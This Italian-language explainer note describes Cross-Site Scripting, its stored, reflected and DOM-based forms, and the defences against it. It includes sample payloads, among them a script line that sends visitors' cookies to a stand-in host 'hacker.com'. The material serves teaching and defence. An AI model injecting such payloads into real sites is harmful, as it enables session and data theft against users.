---
date: 2026-09-02
tags:
  - informatica
  - pubblico

---
# Cross-Site Scripting (XSS)
---
Attacco informatico in cui un attaccante inserisce codice JavaScript malevolo all'interno di una pagina web, con l'obiettivo di farlo eseguire nel browser di altri utenti. 

Quell'abbreviazione viene da "X" (letto come "Cross"), e poi le due "S" che stanno per "Site" e "Scripting", per evitare venga confusa con "CSS".

### Come funziona?
Molti siti web permettono agli utenti di inserire vari tipi di contenuti, per esempio commenti, messaggi o dati nei form. Se però l'applicazione non controlla questi input, un attaccante può inserire del codice JavaScript che viene poi incluso nella pagina web.

Per esempio, un sito potrebbe permettere di pubblicare un commento:

```html
<p>Questo è un bel sito!</p>
```

Un attaccante potrebbe invece inserire:

```html
<p>Ottimo prodotto!</p> <script>fetch('http://hacker.com/rubata?cookie=' + document.cookie)</script>
```

Se il sito inserisce direttamente questo contenuto nella pagina senza sanificarlo, il browser dell'utente potrebbe interpretare `<script>` come codice JavaScript ed eseguirlo, che nel pratico significa: utente visita il sito web, quel sito esegue lo script e l'utente si ritrova dati rubati senza neppure aver toccato tastiera.

### Cosa può fare?
A seconda del contesto, un XSS può permettere all'attaccante di:

- **Rubare informazioni:** leggere dati presenti nella pagina a cui l'utente ha accesso.
- **Rubare sessioni:** in determinate condizioni, ottenere informazioni che permettono di sfruttare la sessione dell'utente.
- **Modificare la pagina:** mostrare contenuti falsi o modificare ciò che l'utente visualizza.
- **Eseguire azioni per conto dell'utente:** sfruttare i privilegi della vittima sul sito.

### Tipi di XSS
Si distinguono in base a dove viene memorizzato o elaborato il codice malevolo, e al modo in cui questo raggiunge il browser della vittima.

#### Stored XSS (o persistent)
Il codice malevolo viene salvato all'interno del database del server, e eseguito automaticamente ogni volta che un utente visualizza quel contenuto.

Per fare un esempio:

- Visiti un e-commerce, e apri la pagina di recensione di un prodotto.
- L'hacker scrive recensione "Ottimo scarponi! <script>alert(document.cookie)</script>"
- Il server salva quel testo nel database.
- Da quel momento in poi, chiunque apre quella sezione recensioni vedrà il proprio browser eseguire automaticamente lo script creato dall'attaccante.

#### Reflected XSS (o non persistent)
Il codice malevolo viene inserito nella richiesta HTTP e "riflesso" immediatamente nella risposta del server verso il browser della vittima.

Per fare un esempio:

- Un sito di notizie ha una barra di ricerca.
  
- Quando cerchi una parola, la pagina prende quella parola e invia la tua richiesta al server, es. `[https://sito-notizie.it/cerca?q=Meteo](https://sito-notizie.it/cerca?q=Meteo)` .

- Tu ricevi la tua ricerca, creata a partire dal contenuto della variabile `q=`.
  
- L'attaccante potrebbe creare e inviarti un link trappola nel quale il valore della variabile `q=` è popolato con del codice Javascript, es. `[https://sito.it/cerca?q=](https://sito.it/cerca?q=)<script>alert('Attacco!')</script>`

- Tu clicchi sul link, il server legge il parametro `q` e lo esegue subito nella pagina HTML di risposta.

È da questo comportamento che prende il nome "riflesso": parte dal link, entra nel server con la richiesta e si riflette immediatamente nella risposta lato utente.

#### DOM-based XSS
Il codice malevolo viene per intero dal browser della vittima tramite JavaScript già presente nella pagina, senza che il server venga coinvolto. È diverso dall'XSS riflesso nel fatto che a inserire il codice malevolo in pagina non è il server, ma il browser dell'utente stesso. 

Per fare un esempio:

- Un sito ha una pagina di benvenuto che legge il tuo nome dall'URL tramite uno script frontend JavaScript e lo mostra a schermo (es. `welcome.html#Mario`).

- L'attaccante invia alla vittima un link con uno script al posto di quel nome, es. `[https://sito.it/welcome.html#](https://sito.it/welcome.html#)<img src=x onerror=alert('DOM-XSS')>`

- La vittima apre il link.
  
- Il server invia il file `welcome.html`, senza nemmeno leggere la parte che sta dopo il `#`.

- Il JavaScript del sito scaricato sul PC della vittima legge la parte dopo il `#` e la inserisce dinamicamente nella pagina, forzando il browser ad eseguire lo script malevolo a insaputa del server.

Si chiama DOM-based perchè l'attacco avviene attraverso la manipolazione del Document Object Model all'interno del browser dell'utente.

### Come si previene?
La difesa principale consiste nel trattare gli input degli utenti come dati e non come codice, impedendo che contenuti forniti dall'utente vengano interpretati dal browser come JavaScript.

- **Valida gli input:** controlla che i dati inseriti rispettino il formato previsto.

- **Sanifica l'output:** codifica correttamente i dati prima di inserirli all'interno della pagina HTML.

- **Usa Content Security Policy (CSP):** limita le sorgenti da cui il browser può eseguire script, es. esegui Javascript solo se proviene da file salvati sul tuo stesso dominio o da un dominio fidato che definisci tu.

- **Usa cookie sicuri:** flag come `HttpOnly`, istruisce il tuo browser a memorizzare cookie e inviarli al server solo durante le richieste HTTP, ma nascondendole a JavaScript per evitare informazioni sensibili vengano rubate.

---